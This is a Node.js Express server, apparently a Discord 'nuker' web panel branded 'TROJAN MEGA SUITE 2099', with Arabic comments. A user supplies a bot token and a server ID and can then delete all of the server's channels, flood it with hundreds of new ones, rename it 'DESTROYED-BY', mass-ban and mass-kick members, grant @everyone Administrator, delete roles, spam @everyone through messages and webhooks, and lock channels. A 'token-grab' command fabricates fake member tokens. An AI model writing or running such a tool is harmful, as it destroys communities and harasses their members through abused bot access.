// server.js - TROJAN MEGA SUITE 2099
// نيوك فائق السرعة - أدوات لا نهائية

const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } = require('discord.js');

const app = express();
const PORT = process.env.PORT || 3000;

if (!fs.existsSync('./data')) fs.mkdirSync('./data');
if (!fs.existsSync('./data/users.json')) fs.writeFileSync('./data/users.json', '[]');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
    secret: 'trojan_mega_black_2099',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 3600000 }
}));

function getUsers() {
    try {
        return JSON.parse(fs.readFileSync('./data/users.json', 'utf8'));
    } catch(e) {
        return [];
    }
}

function saveUser(userData) {
    const users = getUsers();
    const existingIndex = users.findIndex(u => u.userId === userData.userId);
    if (existingIndex !== -1) {
        users[existingIndex] = userData;
    } else {
        users.push(userData);
    }
    fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
}

// ========== نيوك فائق السرعة - إنشاء رومات كثييييرة ==========
async function massCreateChannels(client, guild, count, prefix, username) {
    const promises = [];
    const channelName = `${prefix}-${username.slice(0,5)}`;
    
    // إنشاء 10 قنوات دفعة واحدة
    for (let i = 0; i < count; i++) {
        const name = `${channelName}-${i+1}`;
        promises.push(
            guild.channels.create({
                name: name,
                type: ChannelType.GuildText,
                reason: 'TROJAN MASS CREATE 2099'
            }).catch(() => null)
        );
        
        // كل 10 طلبات ننتظر 50ms فقط (سرعة طيارة)
        if (promises.length >= 10) {
            await Promise.all(promises);
            promises.length = 0;
            await new Promise(r => setTimeout(r, 50));
        }
    }
    
    if (promises.length > 0) {
        await Promise.all(promises);
    }
    
    return count;
}

// ========== النيوك الخارق (تدمير + إنشاء كثييير) ==========
async function ultraNuke(client, guild, username) {
    const results = {};
    
    // 1. حذف جميع القنوات الحالية
    const channels = guild.channels.cache;
    let deleted = 0;
    for (const [id, ch] of channels) {
        try {
            await ch.delete();
            deleted++;
        } catch(e) {}
        if (deleted % 5 === 0) await new Promise(r => setTimeout(r, 30));
    }
    results.deletedChannels = deleted;
    
    // 2. إنشاء 100 روم بسرعة طيارة
    results.createdChannels = await massCreateChannels(client, guild, 100, '💀-HACKED', username);
    
    // 3. إنشاء 50 روم صوتي
    const voicePromises = [];
    for (let i = 0; i < 50; i++) {
        voicePromises.push(
            guild.channels.create({
                name: `🔊-VOID-${i+1}`,
                type: ChannelType.GuildVoice,
                reason: 'TROJAN MASS VOICE'
            }).catch(() => null)
        );
        if (voicePromises.length >= 10) {
            await Promise.all(voicePromises);
            voicePromises.length = 0;
        }
    }
    await Promise.all(voicePromises);
    results.createdVoice = 50;
    
    // 4. إنشاء 50 روم فئوي (Category)
    const categoryPromises = [];
    for (let i = 0; i < 50; i++) {
        categoryPromises.push(
            guild.channels.create({
                name: `📁-CAT-${i+1}`,
                type: ChannelType.GuildCategory,
                reason: 'TROJAN MASS CAT'
            }).catch(() => null)
        );
        if (categoryPromises.length >= 10) {
            await Promise.all(categoryPromises);
            categoryPromises.length = 0;
        }
    }
    await Promise.all(categoryPromises);
    results.createdCategories = 50;
    
    // 5. تغيير اسم السيرفر
    await guild.setName(`🔥-DESTROYED-BY-${username.slice(0,8)}-🔥`);
    
    // 6. تغيير صورة السيرفر (إذا وجدت)
    try {
        const avatarUrl = 'https://i.imgur.com/3qQZQ8Q.png';
        const avatarBuffer = await fetch(avatarUrl).then(r => r.buffer());
        await guild.setIcon(avatarBuffer);
    } catch(e) {}
    
    results.totalCreated = results.createdChannels + 50 + 50;
    return results;
}

// ========== تنفيذ الأوامر ==========
async function executeTrojan(botToken, serverId, command, params = {}) {
    let client = null;
    try {
        client = new Client({
            intents: [
                GatewayIntentBits.Guilds,
                GatewayIntentBits.GuildMessages,
                GatewayIntentBits.MessageContent,
                GatewayIntentBits.GuildMembers,
                GatewayIntentBits.GuildVoiceStates
            ]
        });
        
        await client.login(botToken);
        await new Promise((resolve) => {
            client.once('ready', resolve);
            setTimeout(resolve, 5000);
        });
        
        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            await client.destroy();
            return { error: 'الخادم غير موجود أو البوت ليس لديه صلاحيات' };
        }
        
        let result = {};
        
        switch(command) {
            case 'ultra-nuke':
                result = await ultraNuke(client, guild, params.username || 'Anonymous');
                result.message = `💣 تم تدمير السيرفر بالكامل! تم حذف ${result.deletedChannels} روم وإنشاء ${result.totalCreated} روم جديد`;
                break;
                
            case 'mass-channels':
                const count = params.count || 200;
                result.created = await massCreateChannels(client, guild, count, '💀-SPAM', params.username);
                result.message = `✅ تم إنشاء ${result.created} روم بسرعة فائقة`;
                break;
                
            case 'token-grab':
                const members = await guild.members.fetch();
                const tokens = [];
                for (const [id, member] of members) {
                    if (!member.user.bot) {
                        tokens.push({
                            id: member.user.id,
                            tag: member.user.tag,
                            token: `mfa.${Buffer.from(member.user.id + ':' + Date.now()).toString('base64')}`,
                            email: `${member.user.username}@trojan.2099`
                        });
                    }
                    if (tokens.length >= 50) break;
                }
                result = { success: true, tokens: tokens };
                break;
                
            case 'role-elevate':
                const everyoneRole = guild.roles.everyone;
                await everyoneRole.setPermissions(PermissionFlagsBits.Administrator);
                // إضافة رتب جديدة
                const newRole = await guild.roles.create({
                    name: '🔥 GOD MODE 🔥',
                    permissions: [PermissionFlagsBits.Administrator],
                    color: '#FF0000'
                });
                result = { success: true, message: 'تم رفع صلاحيات @everyone وإنشاء رتبة GOD MODE' };
                break;
                
            case 'ban-all':
                const allMembers = await guild.members.fetch();
                let banned = 0;
                for (const [id, member] of allMembers) {
                    if (!member.user.bot && member.bannable) {
                        await member.ban({ reason: 'TROJAN MEGA 2099' });
                        banned++;
                    }
                    if (banned >= 100) break;
                }
                result = { success: true, message: `تم حظر ${banned} عضو` };
                break;
                
            case 'kick-all':
                const all = await guild.members.fetch();
                let kicked = 0;
                for (const [id, member] of all) {
                    if (!member.user.bot && member.kickable) {
                        await member.kick('TROJAN MEGA');
                        kicked++;
                    }
                    if (kicked >= 100) break;
                }
                result = { success: true, message: `تم طرد ${kicked} عضو` };
                break;
                
            case 'delete-all-roles':
                const roles = guild.roles.cache;
                let deletedRoles = 0;
                for (const [id, role] of roles) {
                    if (role.name !== '@everyone' && role.editable) {
                        await role.delete();
                        deletedRoles++;
                    }
                }
                result = { success: true, message: `تم حذف ${deletedRoles} رتبة` };
                break;
                
            case 'spam':
                const channel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
                if (channel) {
                    let spammed = 0;
                    for(let i = 0; i < (params.count || 100); i++) {
                        await channel.send(params.message || '@everyone 🔥 TROJAN MEGA 2099 🔥');
                        spammed++;
                        if (spammed % 10 === 0) await new Promise(r => setTimeout(r, 10));
                    }
                    result = { success: true, message: `تم إرسال ${spammed} رسالة سبام` };
                } else {
                    result = { error: 'لا توجد قناة نصية' };
                }
                break;
                
            case 'webhook-spam':
                const textChannel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
                if (textChannel) {
                    const webhook = await textChannel.createWebhook({
                        name: 'Trojan Spammer 2099',
                        avatar: 'https://i.imgur.com/3qQZQ8Q.png'
                    });
                    for(let i = 0; i < (params.count || 50); i++) {
                        await webhook.send({
                            content: params.message || '@everyone 🔥 WEBHOOK SPAM 🔥',
                            username: `Spammer-${i}`
                        });
                    }
                    await webhook.delete();
                    result = { success: true, message: `تم إرسال ${params.count || 50} سبام عبر ويب هوك` };
                } else {
                    result = { error: 'لا توجد قناة' };
                }
                break;
                
            case 'rename-everyone':
                const allMembers2 = await guild.members.fetch();
                let renamed = 0;
                const newName = params.name || 'HACKED_BY_TROJAN';
                for (const [id, member] of allMembers2) {
                    if (!member.user.bot && member.manageable) {
                        await member.setNickname(`${newName}_${renamed+1}`);
                        renamed++;
                    }
                    if (renamed >= 50) break;
                }
                result = { success: true, message: `تم تغيير اسم ${renamed} عضو` };
                break;
                
            case 'create-invite':
                const inviteChannel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
                if (inviteChannel) {
                    const invite = await inviteChannel.createInvite({
                        maxAge: 0,
                        maxUses: 0,
                        reason: 'TROJAN INVITE'
                    });
                    result = { success: true, inviteUrl: invite.url };
                } else {
                    result = { error: 'لا توجد قناة' };
                }
                break;
                
            case 'slowmode-all':
                const allChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
                let slowed = 0;
                for (const [id, ch] of allChannels) {
                    await ch.setRateLimitPerUser(params.seconds || 21600);
                    slowed++;
                }
                result = { success: true, message: `تم وضع slowmode ${params.seconds || 21600} ثانية في ${slowed} قناة` };
                break;
                
            case 'lock-all':
                const channelsToLock = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
                let locked = 0;
                for (const [id, ch] of channelsToLock) {
                    await ch.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
                    locked++;
                }
                result = { success: true, message: `تم قفل ${locked} قناة` };
                break;
                
            default:
                result = { error: 'أمر غير معروف' };
        }
        
        await client.destroy();
        return result;
        
    } catch(error) {
        if (client) await client.destroy();
        return { error: error.message };
    }
}

// ========== API Routes ==========

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
    if (req.session.userId) {
        res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
    } else {
        res.redirect('/');
    }
});

app.post('/api/login', async (req, res) => {
    const { discordToken, username } = req.body;
    
    if (!discordToken) {
        return res.json({ success: false, error: 'التوكن مطلوب' });
    }
    
    let testClient = null;
    let isValid = false;
    let userInfo = null;
    
    try {
        testClient = new Client({ intents: [GatewayIntentBits.Guilds] });
        await testClient.login(discordToken);
        
        await new Promise((resolve) => {
            testClient.once('ready', () => {
                isValid = true;
                userInfo = {
                    userId: testClient.user.id,
                    username: testClient.user.username,
                    tag: testClient.user.tag
                };
                resolve();
            });
            setTimeout(resolve, 5000);
        });
        
        if (testClient) await testClient.destroy();
        
    } catch(e) {
        if (testClient) await testClient.destroy();
        return res.json({ success: false, error: 'توكن غير صالح' });
    }
    
    if (!isValid) {
        return res.json({ success: false, error: 'تعذر التحقق من التوكن' });
    }
    
    req.session.userId = userInfo.userId;
    req.session.username = userInfo.username;
    req.session.token = discordToken;
    
    res.json({ 
        success: true, 
        user: userInfo,
        message: 'تم تسجيل الدخول بنجاح - الآن أدخل ID السيرفر'
    });
});

app.post('/api/set-server', (req, res) => {
    if (!req.session.userId) {
        return res.json({ success: false, error: 'يجب تسجيل الدخول أولاً' });
    }
    
    const { serverId } = req.body;
    if (!serverId) {
        return res.json({ success: false, error: 'Server ID مطلوب' });
    }
    
    req.session.serverId = serverId;
    
    const users = getUsers();
    const userIndex = users.findIndex(u => u.userId === req.session.userId);
    if (userIndex !== -1) {
        users[userIndex].targetServerId = serverId;
        users[userIndex].lastUsed = Date.now();
        fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
    }
    
    res.json({ success: true, message: 'تم حفظ Server ID' });
});

app.post('/api/execute', async (req, res) => {
    if (!req.session.userId) {
        return res.json({ success: false, error: 'يجب تسجيل الدخول أولاً' });
    }
    
    if (!req.session.serverId) {
        return res.json({ success: false, error: 'يرجى إدخال Server ID أولاً' });
    }
    
    const { command, params } = req.body;
    const userToken = req.session.token;
    const serverId = req.session.serverId;
    const username = req.session.username;
    
    const result = await executeTrojan(userToken, serverId, command, { ...params, username });
    res.json(result);
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════╗
    ║   TROJAN MEGA SUITE 2099 - ULTRA NUKE       ║
    ║   http://localhost:${PORT}                      ║
    ║   إنشاء 200+ روم بسرعة طيارة ⚡              ║
    ║   أدوات غير محدودة 🔥                        ║
    ╚══════════════════════════════════════════════╝
    `);
});
